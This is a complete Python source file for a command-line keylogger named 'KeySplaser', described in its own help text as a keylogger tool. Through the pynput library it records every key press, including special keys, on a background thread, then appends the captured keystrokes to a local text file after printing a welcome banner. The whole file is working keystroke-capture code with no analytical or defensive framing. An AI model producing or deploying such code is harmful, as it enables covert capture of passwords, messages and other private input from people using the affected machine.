import os
import argparse
import threading
import logging
from pynput import keyboard
from colorama import init, Fore, Style 

# Initialize Colorama
init()

class KeySplaser:
    def __init__(self, log_file):
        """
        Initializes the KeySplaser.
        
        :param log_file: Path to the file where keystrokes will be logged.
        """
        self.log_file = self.validate_log_file(log_file)
        self.log = []
        self.running = False

    def validate_log_file(self, log_file):
        """
        Validate and return a valid log file path.
        
        :param log_file: The proposed log file path.
        :return: Validated log file path.
        """
        if not log_file.endswith('.txt'):
            log_file += '.txt'
        return log_file

    def _on_press(self, key):
        """
        Handles key press events.

        :param key: The key that was pressed.
        """
        try:
            # If the key has a character representation, log it
            self.log.append(key.char)
        except AttributeError:
            # For special keys, log the name
            self.log.append(f'[{key.name}]')

    def _write_log(self):
        """
        Writes the captured keystrokes to the log file.
        """
        try:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.log))  # Write all captured keystrokes at once
                self.log = []
        except Exception as e:
            logging.error(f"Failed to write log: {e}")

    def _start_logging(self):
        """
        Starts the KeySplaser.
        """
        self.running = True
        with keyboard.Listener(on_press=self._on_press) as listener:
            while self.running:
                listener.join(timeout=0.1)  # Non-blocking join to allow stopping

    def start(self):
        """
        Starts the logging thread.
        """
        self.thread = threading.Thread(target=self._start_logging)
        self.thread.start()
        logging.info(f"{Fore.GREEN}KeySplaser started{Style.RESET_ALL}")

    def stop(self):
        """
        Stops the logging thread and writes remaining logs.
        """
        self.running = False
        self.thread.join()
        self._write_log()
        logging.info(f"{Fore.RED}KeySplaser stopped{Style.RESET_ALL}")

def main():
    print(f"{Fore.BLUE}Welcome{Style.RESET_ALL}")
    print(f"      {Fore.BLUE}To{Style.RESET_ALL}")
    print(f"""{Fore.YELLOW}        
#  ██╗  ██╗███████╗██╗   ██╗     ███████╗██████╗ ██╗      █████╗ ███████╗██╗  ██╗███████╗██████╗ 
#  ██║ ██╔╝██╔════╝╚██╗ ██╔╝     ██╔════╝██╔══██╗██║     ██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
#  █████╔╝ █████╗   ╚████╔╝█████╗███████╗██████╔╝██║     ███████║███████╗███████║█████╗  ██████╔╝
#  ██╔═██╗ ██╔══╝    ╚██╔╝ ╚════╝╚════██║██╔═══╝ ██║     ██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
#  ██║  ██╗███████╗   ██║        ███████║██║     ███████╗██║  ██║███████║██║  ██║███████╗██║  ██║
#  ╚═╝  ╚═╝╚══════╝   ╚═╝        ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
#                                                                                                   
    {Style.RESET_ALL}""")
    print(f"{Fore.RED}Use -h or --help to show the help menu{Style.RESET_ALL}")
    
    parser = argparse.ArgumentParser(description="A simple Keylogger Tool")
    parser.add_argument('-f', '--log_file', type=str, default=os.path.join(os.path.dirname(__file__), "keylog.txt"),
                        help="The file where keystrokes will be logged. (Default - keylog.txt)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    
    key_splaser = KeySplaser(args.log_file)  # Instantiate KeySplaser
    
    try:
        key_splaser.start()
        input("Press Enter to stop...\n")  # Keep the main thread running
    except KeyboardInterrupt:
        logging.info("Interrupted by user")
    finally:
        key_splaser.stop()

if __name__ == "__main__":
    main()